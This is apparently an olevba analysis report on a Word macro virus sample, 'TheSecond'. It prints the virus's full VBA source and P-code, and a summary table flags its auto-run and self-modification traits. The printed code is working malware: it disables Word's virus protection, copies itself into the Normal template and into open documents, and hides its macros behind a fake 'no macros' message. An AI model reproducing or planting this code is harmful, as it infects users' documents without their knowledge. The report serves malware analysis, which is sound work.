olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheSecond.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheSecond.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: Virus.MSWord.TheSecond.j - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Copyrights = "The Second, 2000"
  NickName = "Revenger"
  Options.VirusProtection = False
  flag = False
  If Documents.Count >= 1 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    x = Application.StartupPath + "\TheSecond.tmp"
    If Not flag Then
      ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
      NormalTemplate.VBProject.VBComponents.Import (x)
    End If
    flag = False
    infected = False
    havesave = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    If Not flag Then
      NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
      ActiveDocument.VBProject.VBComponents.Import (x)
      infected = True
    End If
    If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
    End If
    ActiveDocument.Saved = havesave
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Íþáèí"
    .Replacement.Text = "Íóäèí"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Íóäèí"
    .Replacement.Text = "Íþáèí"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.TheSecond.j
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/TheSecond - 3640 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	LitStr 0x0010 "The Second, 2000"
' 	St Copyrights 
' Line #2:
' 	LitStr 0x0008 "Revenger"
' 	St NickName 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	St flag 
' Line #5:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #6:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter 
' 	For 
' Line #8:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000E "\TheSecond.tmp"
' 	Add 
' 	St x 
' Line #11:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #12:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #13:
' 	Ld x 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitVarSpecial (False)
' 	St flag 
' Line #16:
' 	LitVarSpecial (False)
' 	St infected 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St havesave 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #19:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #22:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	Ld x 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #24:
' 	LitVarSpecial (True)
' 	St infected 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld havesave 
' 	Ld infected 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld havesave 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FilePrint())
' Line #32:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #33:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #34:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #35:
' 	LitStr 0x0005 "Íþáèí"
' 	MemStWith Then 
' Line #36:
' 	LitStr 0x0005 "Íóäèí"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #37:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #38:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #39:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #42:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #43:
' 	EndWith 
' Line #44:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #45:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #46:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #47:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #48:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #49:
' 	LitStr 0x0005 "Íóäèí"
' 	MemStWith Then 
' Line #50:
' 	LitStr 0x0005 "Íþáèí"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #51:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #52:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #53:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #54:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #55:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #56:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #57:
' 	EndWith 
' Line #58:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Sub ToolsMacro())
' Line #61:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub ViewVBCode())
' Line #64:
' 	LitStr 0x0019 "Íåò çàãðóæåííûõ ìàêðîñîâ!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #65:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

